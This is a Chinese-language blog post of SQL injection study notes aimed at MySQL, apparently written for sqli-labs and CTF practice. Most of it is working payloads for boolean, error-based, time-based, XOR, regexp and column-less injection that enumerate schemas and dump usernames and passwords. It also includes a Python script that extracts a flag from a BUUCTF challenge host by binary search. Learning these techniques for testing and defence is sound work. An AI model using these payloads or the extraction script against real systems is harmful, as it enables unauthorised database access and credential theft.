
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>sql - Hexo</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="[TOC]
知识点字符型注入判断注入方式
123id=1 正确id=1&amp;#x27; 错误id=1&amp;#x27;--+ 视报错情况而定

猜测参数闭合方式,然后采用闭合方式的后半部分将语句闭合，直到页面,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
    <link rel="icon" href="/img/85E0B2FE93C1D59651632D67AC59568B.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">Hexo</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">sql</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">sql</h1>
        <div class="stuff">
            <span>十二月 26, 2021</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>


        </div>
        <div class="content markdown">
            <p>[TOC]</p>
<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h1><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>判断注入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 正确</span><br><span class="line">id=1&#x27; 错误</span><br><span class="line">id=1&#x27;--+ 视报错情况而定</span><br></pre></td></tr></table></figure>

<p>猜测参数闭合方式,然后采用闭合方式的后半部分将语句闭合，直到页面回显正常</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>数据不能回显到前端页面</p>
<h3 id="•基于布尔-SQL-盲注"><a href="#•基于布尔-SQL-盲注" class="headerlink" title="•基于布尔 SQL 盲注"></a>•基于布尔 SQL 盲注</h3><h4 id="▲left"><a href="#▲left" class="headerlink" title="▲left"></a>▲left</h4><p> <strong>left(database(),1)&gt;’s’ //left()函数 Explain:database()显示数     据库名称</strong>，</p>
<p>left(a,b)从左侧截取 a 的前 b 位 </p>
<p><strong>测试正确与不正确时候的回显</strong></p>
<p><strong>后面语句为真则返回为真，后面语句错误则返回为假</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%20left(version(),1)=5%23（通过数据可的版本号）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">猜数据库名</span><br><span class="line">?id=1%27and%20length(database())=8%23</span><br><span class="line">?id=1%27and%20left(database(),1)&gt;%27a%27--+</span><br><span class="line">得知第一位为S，测试第二位</span><br><span class="line">?id=1%27and%20left(database(),2)&gt;%27sa%27--+</span><br><span class="line"></span><br><span class="line">猜表名</span><br><span class="line">（第一个表名）</span><br><span class="line">?id=1&quot; and left((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0,1),1)&gt;&#x27;l&#x27; --+</span><br><span class="line">（第二个表名）</span><br><span class="line">?id=1&quot; and left((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 1,1),1)&gt;&#x27;r&#x27; --+</span><br><span class="line"></span><br><span class="line">猜列名</span><br><span class="line">?id=1&quot; and left((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),1)&gt;&#x27;l&#x27; --+</span><br></pre></td></tr></table></figure>

<p><strong>limit 0,x  显示查询结果中的x行</strong></p>
<h4 id="▲ascii-substr"><a href="#▲ascii-substr" class="headerlink" title="▲ascii() substr()"></a>▲ascii() substr()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+ （第一个表的第一个字符）</span><br><span class="line">id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),2,1))%3E108--+（第一个表的第二个字符）</span><br><span class="line">第二个表</span><br><span class="line">?id=1%27and%20ascii(substr((select%20table_name%20from%20i</span><br><span class="line">nformation_schema.tables%20where%20table_schema=database()%20limit%201,1),1,1))%3E113</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>

<p>//substr()函数，ascii()函数 Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值 </p>
<h4 id="▲ascii-substr-select-database-1-1-98"><a href="#▲ascii-substr-select-database-1-1-98" class="headerlink" title="▲ascii(substr((select database()),1,1))=98"></a>▲<strong>ascii(substr((select database()),1,1))=98</strong></h4><h4 id="▲ord-mid"><a href="#▲ord-mid" class="headerlink" title="▲ord() mid()"></a>▲ord() mid()</h4><p><strong>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</strong></p>
<p> //ORD()函数，MID()函数 Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值 </p>
<h4 id="▲regexp-正则注入"><a href="#▲regexp-正则注入" class="headerlink" title="▲regexp 正则注入"></a>▲<strong>regexp 正则注入</strong></h4><p>正则注入介绍：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a> </p>
<p><strong>用法介绍</strong>：<strong>select user() regexp ‘^[a-z]’;</strong> </p>
<p>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。 第二位可以用 select user() regexp ‘^ro’来进行。 Mysql 注入—sqlilabs—lcamry 19 当正确的时候显示结果为 1，不正确的时候显示结果为 0. </p>
<p><strong>示例介绍：</strong> </p>
<p>select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0)); </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=(user() regexp&#x27;^ri&#x27;); </span><br></pre></td></tr></table></figure>

<p>通过 <strong>if 语句</strong>的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 于 0 或者 1 进行判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1); </span><br><span class="line"> </span><br><span class="line"> ?id=1&#x27; and 1=(select 1 from information_schema.columns where</span><br><span class="line">table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1)--+</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>这里利用 <strong>select</strong> 构造了一个判断语句。我们只需要更换 regexp 表达式即可 ‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE </p>
<p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在 无法判断的情况下，可以用 table_name regexp ‘^username$’来进行判断。^是从开头进行 匹配，$是从结尾开始判断。更多的语法可以参考 mysql 使用手册进行了解。 </p>
<p>好，这里思考一个问题？ table_name 有好几个，我们只得到了一个 user，如何知道其 他的？</p>
<p> 这里可能会有人认为使用 limit 0，1 改为 limit 1,1。</p>
<p> 但是这种做法是错误的，limit 作用在前面的 select 语句中，而不是 regexp。那我们该如 何选择。其实在 regexp 中我们是取匹配 table_name 中的内容，只要 table_name 中有的内 容，我们用 regexp 都能够匹配到。因此上述语句不仅仅可以选择 user，<strong>还可以匹配其他项</strong>。 </p>
<h4 id="▲like"><a href="#▲like" class="headerlink" title="▲like"></a>▲like</h4><p>匹配注入 和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。 </p>
<p>用法：select user() like ‘ro%’</p>
<h3 id="•基于报错的-SQL-盲注"><a href="#•基于报错的-SQL-盲注" class="headerlink" title="•基于报错的 SQL 盲注"></a>•基于报错的 SQL 盲注</h3><h4 id="▲floor"><a href="#▲floor" class="headerlink" title="▲floor"></a>▲floor</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;** </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">?id=1&#x27; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">?id=1&#x27; union select null,count(*),concat((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">?id=1&#x27; union select null,count(*),concat((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 7,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">?id=1&#x27; union select null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">字段数</span><br><span class="line">?id=1&#x27; order by 4--+</span><br><span class="line"></span><br><span class="line">数据库</span><br><span class="line">1&#x27; union all select count(*),2,concat( &#x27;~&#x27;,(select schema_name from information_schema.schemata limit 4,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">1&#x27; union all select count(*),2,concat( &#x27;~&#x27;,(select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">1&#x27; union all select count(*),1,concat( &#x27;~&#x27;,(select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23 </span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">1&#x27; union all select count(*),1,concat( &#x27;~&#x27;,(select concat(id,username,password) from users limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用concat聚合函数<br>参考资料：<a target="_blank" rel="noopener" href="http://www.2cto.com/article/201303/192718.html">http://www.2cto.com/article/201303/192718.html</a></p>
<p>简单的说，使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。</p>
<p>比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
<p>双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来</p>
<p>//explain:此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时 重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需 要多试几次才行。</p>
<p> 以上语句可以简化成如下的形式。</p>
<p> select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2)) </p>
<p>如果关键的表被禁用了，可以使用这种形式 </p>
<p>select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) </p>
<p>如果 rand 被禁用了可以使用用户变量来报错 </p>
<p>select min(@a:=1) from information_schema.tables group by concat(passwo rd,@a:=(@a+1)%2)</p>
<h4 id="▲-double-数值类型超出范围进行报错注入"><a href="#▲-double-数值类型超出范围进行报错注入" class="headerlink" title="▲ double 数值类型超出范围进行报错注入"></a>▲ double 数值类型超出范围进行报错注入</h4><p><strong>select exp(~(select * FROM(SELECT USER())a))</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2, 3--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">select exp(~(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x));</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">select exp(~ (select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x));</span><br></pre></td></tr></table></figure>

<p>//double 数值类 型超出范围 //Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上 可以参考 exp 报错文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a> </p>
<h4 id="▲双注"><a href="#▲双注" class="headerlink" title="▲双注"></a>▲双注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">数据库</span><br><span class="line">1&quot; union select count(*),2,concat_ws(char(58),(select version()) ,floor(rand(0)*2)) a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">获取表</span><br><span class="line">1&quot; union all select count(*),1,concat(&#x27;~&#x27;, (select schema_name from information_schema.schemata limit 4,1),floor(rand(0)*2)) a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">1&quot; union all select count(*),1,concat(&#x27;~&#x27;,(select concat(username,password) from users limit 0,1),&#x27;~&#x27;,floor(rand(0)*2)) a from information_schema.tables group by a %23</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="▲bigint"><a href="#▲bigint" class="headerlink" title="▲bigint"></a>▲bigint</h4><p><strong>select !(select * from (select user())x) -（ps:这是减号） ~0</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">select !(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x)-~0;</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">!(select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x)-~0;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>//bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上 Mysql 注入—sqlilabs—lcamry 21 可以参考文章 bigint 溢出文章 <a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a> </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43902454/article/details/96495984">(61条消息) 基于BIGINT溢出错误的SQL注入_乌拉那拉氏狂徒的博客-CSDN博客</a></p>
<h4 id="▲extractvalue"><a href="#▲extractvalue" class="headerlink" title="▲extractvalue"></a>▲extractvalue</h4><p><strong>extractvalue(1,concat(0x7e,(select @@version),0x7e)) se</strong></p>
<p>//mysql 对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误 </p>
<h4 id="▲updatexml"><a href="#▲updatexml" class="headerlink" title="▲updatexml"></a>▲updatexml</h4><p><strong>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</strong> //mysql 对 xml 数据进行 查询和修改的 xpath 函数，xpath 语法错误 </p>
<h4 id="▲重复性"><a href="#▲重复性" class="headerlink" title="▲重复性"></a>▲重复性</h4><p><strong>select * from (select</strong> <strong>NAME_CONST(version(),1),NAME_CONST(version(),1))x;</strong> //mysql 重复特性，此处重复了 version，所以报错</p>
<h3 id="•基于时间的-SQL-盲注"><a href="#•基于时间的-SQL-盲注" class="headerlink" title="•基于时间的 SQL 盲注"></a>•基于时间的 SQL 盲注</h3><h4 id="▲sleep"><a href="#▲sleep" class="headerlink" title="▲sleep"></a>▲sleep</h4><p><strong>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</strong> </p>
<p>//if 判断语句，条件为假， 执行 sleep Ps：遇到以下这种利用 sleep()延时注入语句 select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8, 9,.’)); 该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。 </p>
<h4 id="▲BENCHMARK"><a href="#▲BENCHMARK" class="headerlink" title="▲BENCHMARK"></a>▲BENCHMARK</h4><p><strong>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</strong> </p>
<p>//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达 式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执 行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep() 函数进行注入</p>
<h2 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1^1=0 0^0=0 0^1=1`</span><br><span class="line">`1^1^1=0 1^1^0=0`</span><br><span class="line">构造payload:`&#x27;^ascii(mid(database(),1,1)=98)^0</span><br></pre></td></tr></table></figure>

<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://116b4987-7158-432b-a5f2-f3b0154b1157.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">	<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	l = <span class="number">32</span></span><br><span class="line">	r =<span class="number">128</span></span><br><span class="line">	mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(l&lt;r):</span><br><span class="line">		payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">		ly0n = requests.post(url,data=payload)</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> ly0n.text:</span><br><span class="line">			l = mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid</span><br><span class="line">		mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">	<span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> ,result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;^(ascii(mid((password)from(i)))&gt;j)^&#x27;1&#x27;=&#x27;1&#x27;%23</span><br><span class="line">或者</span><br><span class="line">admin&#x27;^(ascii(mid((password)from(i)for(1)))&gt;j)^&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<p>0^1^0 <em>–&gt; 1 语句返回为真</em> 0^0^0 <em>–&gt; 0 语句返回为假</em></p>
<h4 id="过滤了关键字：and、or过滤了逗号，过滤了空格"><a href="#过滤了关键字：and、or过滤了逗号，过滤了空格" class="headerlink" title="过滤了关键字：and、or过滤了逗号，过滤了空格"></a>过滤了关键字：and、or过滤了逗号，过滤了空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;^(ascii(mid((password)from(i)))&gt;j)^(&#x27;2&#x27;&gt;&#x27;1&#x27;)%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 ‘1’=’1</strong></p>
<h2 id="regexp-注入"><a href="#regexp-注入" class="headerlink" title="regexp****注入"></a><strong>regexp****注入</strong></h2><p>基本注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select语句) regexp &#x27;正则&#x27;</span><br></pre></td></tr></table></figure>

<p>接着进行正则注入，若匹配则返回1，不匹配返回0</p>
<p>regexp这个关键字还可以代替where条件里的=号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select (select user_pass from users where user_id = 1) regexp &#x27;^a&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了=、in、like</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (select user_pass from users where user_id = 1) regexp &#x27;bd3$&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>基本注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id = &#x27;1&#x27; union select 1,2,&#x27;a&#x27;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>

<p>过滤了列名，过滤了括号，适用于已知该表的列名以及列名位置的注入</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>一般有个注册页面，然后还有一个修改的页面，里面按照所学知识进行注入</p>
<h2 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h2><h3 id="BUUCTF-WEB-【GYCTF2020】Ezsqli-1-Fan的小酒馆-fanygit-github-io-https-fanygit-github-io-2021-08-21-GYCTF2020-Ezsqli-1-msclkid-75a0462da7f211ecb8afadeb73123d5b"><a href="#BUUCTF-WEB-【GYCTF2020】Ezsqli-1-Fan的小酒馆-fanygit-github-io-https-fanygit-github-io-2021-08-21-GYCTF2020-Ezsqli-1-msclkid-75a0462da7f211ecb8afadeb73123d5b" class="headerlink" title="[BUUCTF-WEB 【GYCTF2020】Ezsqli 1 | Fan的小酒馆 (fanygit.github.io)](https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli 1/?msclkid=75a0462da7f211ecb8afadeb73123d5b)"></a>[BUUCTF-WEB 【GYCTF2020】Ezsqli 1 | Fan的小酒馆 (fanygit.github.io)](<a target="_blank" rel="noopener" href="https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli">https://fanygit.github.io/2021/08/21/[GYCTF2020]Ezsqli</a> 1/?msclkid=75a0462da7f211ecb8afadeb73123d5b)</h3><p>当我们通过暴力破解获取到表名后，如何利用呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</span><br></pre></td></tr></table></figure>

<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p>
<p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
